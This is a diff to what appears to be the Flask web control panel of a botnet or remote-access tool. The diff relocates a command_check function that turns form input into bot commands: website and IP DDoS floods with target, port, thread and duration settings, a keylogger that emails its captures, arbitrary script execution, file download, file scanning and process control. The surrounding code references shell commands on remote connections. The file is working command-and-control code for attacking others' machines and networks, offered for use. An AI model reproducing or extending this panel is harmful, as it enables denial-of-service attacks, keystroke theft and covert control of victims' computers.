@@ -295,6 +295,53 @@ def _take_shell_cmd(i, cmd):
 		del all_connections[i]
 	return(f"Error")
 
+def command_check(command):
+	if command == "stress": 
+		stress_time 	= request.form.get('stress-time')
+		stress_amount 	= request.form.get('stress-tasks')
+		return (f'{command} {stress_time} {stress_amount}')
+
+	elif command == "ddos": 
+		ddos_method 	= request.form.get('ddos-website-method')
+		ddos_target 	= request.form.get('ddos-website-target')
+		ddos_time	 	= request.form.get('ddos-website-time')
+		ddos_thread 	= request.form.get('ddos-website-thread')
+		return (f'{command} {ddos_method} {ddos_target} {ddos_thread} {ddos_time}')
+
+	elif command == "attack": 
+		ddos_method 	= request.form.get('ddos-ip-method')
+		ddos_target 	= request.form.get('ddos-ip-target')
+		ddos_port 		= request.form.get('ddos-ip-port')
+		ddos_time	 	= request.form.get('ddos-ip-time')
+		ddos_thread 	= request.form.get('ddos-ip-thread')
+		return (f'{command} {ddos_method} {ddos_target} {ddos_port} {ddos_thread} {ddos_time}')
+
+	elif command == "keylogger":
+		keylogger_intervals 		= request.form.get('keylogger-intervals')
+		keylogger_reciever_email 	= request.form.get('keylogger-reciever-email')
+		return (f'{command} {keylogger_intervals} {keylogger_reciever_email}')
+
+	elif command == "runscript":
+		script_name 	= request.form.get('runscript-name')
+		script_code 	= request.form.get('runscript-code')
+		script_type 	= request.form.get('script-type-selection')
+		return (f'{command} {script_name} {script_type} {script_code}')
+
+	elif command == "download":
+		download_path 	= request.form.get('download-path')
+		return (f'{command} {download_path}')
+
+	elif command == "scanfiles":
+		scan_files 		= request.form.get('scan-files')
+		return (f'{command} {scan_files}')
+
+	elif command == "processcontrol":
+		process_names 	= request.form.get('process-names')
+		return (f'{command} {process_names}')
+
+	else: return command
+
+
 #region Web GUI
 @app.route('/')
 def redirectLogin(): return redirect(url_for('login'))
@@ -342,53 +389,6 @@ def map_data():
 	try:
 		if session['loggedin'] == True: return render_template('map_data.html')
 	except: return redirect('login.html')
-
-
-def command_check(command):
-	if command == "stress": 
-		stress_time 	= request.form.get('stress-time')
-		stress_amount 	= request.form.get('stress-tasks')
-		return (f'{command} {stress_time} {stress_amount}')
-
-	elif command == "ddos": 
-		ddos_method 	= request.form.get('ddos-website-method')
-		ddos_target 	= request.form.get('ddos-website-target')
-		ddos_time	 	= request.form.get('ddos-website-time')
-		ddos_thread 	= request.form.get('ddos-website-thread')
-		return (f'{command} {ddos_method} {ddos_target} {ddos_thread} {ddos_time}')
-
-	elif command == "attack": 
-		ddos_method 	= request.form.get('ddos-ip-method')
-		ddos_target 	= request.form.get('ddos-ip-target')
-		ddos_port 		= request.form.get('ddos-ip-port')
-		ddos_time	 	= request.form.get('ddos-ip-time')
-		ddos_thread 	= request.form.get('ddos-ip-thread')
-		return (f'{command} {ddos_method} {ddos_target} {ddos_port} {ddos_thread} {ddos_time}')
-
-	elif command == "keylogger":
-		keylogger_intervals 		= request.form.get('keylogger-intervals')
-		keylogger_reciever_email 	= request.form.get('keylogger-reciever-email')
-		return (f'{command} {keylogger_intervals} {keylogger_reciever_email}')
-
-	elif command == "runscript":
-		script_name 	= request.form.get('runscript-name')
-		script_code 	= request.form.get('runscript-code')
-		script_type 	= request.form.get('script-type-selection')
-		return (f'{command} {script_name} {script_type} {script_code}')
-
-	elif command == "download":
-		download_path 	= request.form.get('download-path')
-		return (f'{command} {download_path}')
-
-	elif command == "scanfiles":
-		scan_files 		= request.form.get('scan-files')
-		return (f'{command} {scan_files}')
-
-	elif command == "processcontrol":
-		process_names 	= request.form.get('process-names')
-		return (f'{command} {process_names}')
-
-	else: return command
 
 
 @app.route('/sendcommands.html', methods=['get', 'post'])
